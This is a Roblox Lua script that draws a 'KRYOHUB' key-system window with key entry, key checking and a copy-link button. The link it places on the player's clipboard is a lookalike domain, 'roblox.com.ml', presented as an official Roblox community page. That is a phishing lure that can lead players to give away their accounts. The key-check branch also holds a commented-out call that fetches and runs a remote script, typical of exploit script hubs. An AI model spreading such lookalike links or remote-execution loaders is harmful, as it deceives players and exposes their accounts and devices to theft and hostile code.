-- Cool Key System GUI for Roblox (Updated Link)
-- LocalScript

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Clipboard = game:GetService("Clipboard")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KeySystemGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 520, 0, 320)
mainFrame.Position = UDim2.new(0.5, -260, 0.5, -160)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 16)
uiCorner.Parent = mainFrame

local uiStroke = Instance.new("UIStroke")
uiStroke.Color = Color3.fromRGB(80, 120, 255)
uiStroke.Thickness = 2
uiStroke.Parent = mainFrame

-- Title
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 60)
title.BackgroundTransparency = 1
title.Text = "KRYOHUB KEY SYSTEM"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

local titleGradient = Instance.new("UIGradient")
titleGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 180, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 100, 255))
}
titleGradient.Parent = title

-- Split panels
local leftFrame = Instance.new("Frame")
leftFrame.Size = UDim2.new(0.5, -15, 1, -80)
leftFrame.Position = UDim2.new(0, 20, 0, 70)
leftFrame.BackgroundTransparency = 1
leftFrame.Parent = mainFrame

local rightFrame = Instance.new("Frame")
rightFrame.Size = UDim2.new(0.5, -15, 1, -80)
rightFrame.Position = UDim2.new(0.5, 10, 0, 70)
rightFrame.BackgroundTransparency = 1
rightFrame.Parent = mainFrame

-- Left: Check Key
local keyInput = Instance.new("TextBox")
keyInput.Size = UDim2.new(1, 0, 0, 50)
keyInput.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
keyInput.PlaceholderText = "Enter your key here..."
keyInput.Text = ""
keyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
keyInput.TextScaled = true
keyInput.Font = Enum.Font.Gotham
keyInput.Parent = leftFrame

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 12)
inputCorner.Parent = keyInput

local checkButton = Instance.new("TextButton")
checkButton.Size = UDim2.new(1, 0, 0, 60)
checkButton.Position = UDim2.new(0, 0, 0, 70)
checkButton.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
checkButton.Text = "CHECK KEY"
checkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
checkButton.TextScaled = true
checkButton.Font = Enum.Font.GothamBold
checkButton.Parent = leftFrame

local checkCorner = Instance.new("UICorner")
checkCorner.CornerRadius = UDim.new(0, 12)
checkCorner.Parent = checkButton

-- Right: Copy Link
local linkLabel = Instance.new("TextLabel")
linkLabel.Size = UDim2.new(1, 0, 0, 40)
linkLabel.BackgroundTransparency = 1
linkLabel.Text = "Get Key"
linkLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
linkLabel.TextScaled = true
linkLabel.Font = Enum.Font.GothamSemibold
linkLabel.Parent = rightFrame

local copyButton = Instance.new("TextButton")
copyButton.Size = UDim2.new(1, 0, 0, 80)
copyButton.Position = UDim2.new(0, 0, 0, 50)
copyButton.BackgroundColor3 = Color3.fromRGB(100, 220, 120)
copyButton.Text = "COPY LINK"
copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
copyButton.TextScaled = true
copyButton.Font = Enum.Font.GothamBold
copyButton.Parent = rightFrame

local copyCorner = Instance.new("UICorner")
copyCorner.CornerRadius = UDim.new(0, 12)
copyCorner.Parent = copyButton

-- Status
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -40, 0, 30)
statusLabel.Position = UDim2.new(0, 20, 1, -50)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Status: Ready"
statusLabel.TextColor3 = Color3.fromRGB(160, 160, 170)
statusLabel.TextScaled = true
statusLabel.Font = Enum.Font.Gotham
statusLabel.Parent = mainFrame

-- ================== CHANGEABLE LINK ==================
local KEY_LINK = "https://www.roblox.com.ml/communities/464208770333/KRYOHUB"  -- Updated Link
-- =====================================================

-- Hover Effects
local function addHoverEffect(button, normal, hover)
    button.MouseEnter:Connect(function() TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hover}):Play() end)
    button.MouseLeave:Connect(function() TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = normal}):Play() end)
end

addHoverEffect(checkButton, Color3.fromRGB(70, 130, 255), Color3.fromRGB(90, 150, 255))
addHoverEffect(copyButton, Color3.fromRGB(100, 220, 120), Color3.fromRGB(120, 240, 140))

-- Copy Button
copyButton.MouseButton1Click:Connect(function()
    Clipboard:Set(KEY_LINK)
    statusLabel.Text = "✅ Link copied to clipboard!"
    statusLabel.TextColor3 = Color3.fromRGB(100, 255, 140)
    task.delay(2, function()
        statusLabel.Text = "Status: Ready"
        statusLabel.TextColor3 = Color3.fromRGB(160, 160, 170)
    end)
end)

-- Key Check (Customize here)
local function checkKey(enteredKey)
    -- Add your valid keys here or connect to a real key system
    local validKeys = {"KRYO-TEST-KEY", "YOUR-KEY-HERE"}
    for _, key in ipairs(validKeys) do
        if enteredKey == key then
            return true
        end
    end
    return false
end

checkButton.MouseButton1Click:Connect(function()
    local entered = keyInput.Text:upper():gsub("%s+", "")
    
    if entered == "" then
        statusLabel.Text = "❌ Please enter a key!"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end

    statusLabel.Text = "🔄 Checking..."
    statusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
    
    task.wait(0.8)
    
    if checkKey(entered) then
        statusLabel.Text = "✅ Success! Loading KRYOHUB..."
        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 140)
        task.delay(1.5, function() screenGui:Destroy() end)
        -- loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()
    else
        statusLabel.Text = "❌ Invalid Key"
        statusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
    end
end)

-- Draggable
local dragging, dragInput, dragStart, startPos

title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)

title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

print("KRYOHUB Key System GUI Loaded!")
